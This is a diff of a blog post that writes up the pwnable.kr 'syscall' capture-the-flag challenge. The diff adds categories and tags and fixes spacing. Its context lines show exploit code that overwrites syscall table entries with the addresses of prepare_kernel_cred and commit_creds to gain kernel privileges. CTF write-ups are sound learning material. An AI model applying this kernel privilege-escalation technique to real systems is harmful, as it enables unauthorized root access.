@@ -2,6 +2,8 @@
 layout: post
 title: pwnable.kr syscall
 date: 2023-05-23 14:57 +0800
+categories: [ctf,pwn]
+tag: [pwn, kernel]
 ---
 
 
@@ -79,7 +81,7 @@ unsigned int UNLINK = 10;
 int main(int argc, char **argv){
     sct = (unsigned int**)SYS_CALL_TABLE;
 
-    syscall(SYS_UPPER,    "\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40", (unsigned int**)(0x8003f560));
+    syscall(SYS_UPPER, "\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40", (unsigned int**)(0x8003f560));
 	
     syscall(SYS_UPPER, "\x24\xf9\x03\x80", &sct[EXIT]); //prepare_kernel_cred
     syscall(SYS_UPPER, "\x60\xf5\x03\x80", &sct[UNLINK]); //commit_creds
